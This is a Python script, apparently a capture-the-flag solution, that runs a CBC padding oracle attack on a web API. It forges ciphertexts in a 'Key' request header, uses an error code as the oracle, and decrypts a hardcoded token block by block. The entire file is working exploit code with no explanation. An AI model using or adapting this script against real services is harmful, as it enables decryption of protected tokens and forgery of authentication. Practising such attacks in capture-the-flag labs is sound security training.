import time

import requests
import base64
import json

host = "41934b44-52c1-4a22-9bc2-f02d9206801e.node4.buuoj.cn"
port = 81


def padding_oracle(key):
    user_key_decode = base64.b64decode(key)
    user_key_json_decode = json.loads(user_key_decode)
    signed_key = user_key_json_decode['signed_key']
    signed_key_decoded = base64.b64decode(signed_key)
    #print(signed_key_decoded)
    url = "http://" + host + ":" + str(port) + "/frontend/api/v1/user/info"
    #print(signed_key_decoded)
    # b'ICxkSingDanceRaPY\xac\xad>\xe4h]\xd0[\xfa(_\xb5*N(&\xc8\xc62\xd1\x06>M\xe2\xb7\xdaLEz\x8cd\xfd\x8e\xb2\xde\x19\xbf\x84\x15\xbe\x88\xb8\xae*\xfb\x0c)#\xbeT\xf0\x89\x14\x8e\xce\x96\xb4\xbf\x1aV\xbcU\x98ns;\xf9\xfb\xcb\xf7Z\xb0\x88\x1c\xd4\xa6D\xd2\xa5\x00^\x03\xbd\x1e\xa5\xd1\x19Tf=3g\xcd\xd7\x88'
    # print(len(signed_key_decoded))
    # 112/16=7
    N = 16

    total_plain = ''
    for block in range(0, len(signed_key_decoded) // 16 - 1):
        token = ''
        get = b""
        cipher = signed_key_decoded[16 + block * 16:32 + block * 16]
        for i in range(1, N+1):
            for j in range(0, 256):
                time.sleep(0.1)
                padding = b"".join([(get[n] ^ i).to_bytes(1, 'little') for n in range(len(get))])
                c = b'\x00' * (16 - i) + j.to_bytes(1, 'little') + padding + cipher
                #print(c)
                token = base64.b64encode(c)
                user_key_json_decode['signed_key'] = token.decode("utf-8")
                header = {'Key': base64.b64encode(bytes(json.dumps(user_key_json_decode), "utf-8"))}
                res = requests.get(url, headers=header)
                #print(res.text, j)
                if res.json()['code'] != 205:
                    get = (j ^ i).to_bytes(1, 'little') + get
                    print(get, i)
                    break

        plain = b"".join([(get[i] ^ signed_key_decoded[block * 16 + i]).to_bytes(1, 'little') for i in range(N)])
        print(plain.decode("utf-8"), "block=%d" % block)
        total_plain += plain.decode("utf-8")
        print(total_plain)

    return total_plain


plain_text = padding_oracle(
    "eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWklMUlpNdzdkL0xkZ0xTelZPYmNwOEs0QWkxZkpxTm1ycFY3UWZYMEM2enFOcVljaGNzeUZ2RjlBa1Z2a3o3OE5hQm1ZYmNUeUJjMGY4L2IrakpJSW13PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiNDJIbVc4d2Y3Z2IzNlVKTDRDeExJQXZXdEdrVjNHM1AiLCJleHBpcmVfaW4iOjE2NTE2Njc5NzV9")
print(plain_text)